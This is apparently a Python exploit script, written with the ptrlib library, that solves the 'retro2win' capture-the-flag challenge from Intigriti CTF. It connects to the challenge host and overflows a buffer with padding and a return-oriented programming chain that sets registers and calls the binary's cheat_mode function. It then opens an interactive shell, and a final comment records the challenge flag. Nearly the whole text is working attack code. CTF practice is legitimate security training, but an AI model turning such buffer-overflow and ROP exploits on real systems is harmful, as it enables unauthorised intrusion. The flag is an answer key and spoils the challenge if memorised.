from ptrlib import *

file = "./retro2win"
e = ELF(file)
#sock = Process(file)
sock = Socket("nc retro2win.ctf.intigriti.io 1338")
sock.debug = True

rop_pop_rdi = 0x004009b3
rop_pop_rsi_r15 = 0x004009b1

sock.recvuntil("option:")
sock.sendline("1337")

payload = b"A"*0x18
payload += flat([
    rop_pop_rdi,
    0x2323232323232323,
    rop_pop_rsi_r15,
    0x4242424242424242,
    0,
    e.symbol("cheat_mode")
], map=p64)
sock.recvuntil("cheatcode:")
sock.sendline(payload)

sock.sh()
# INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}

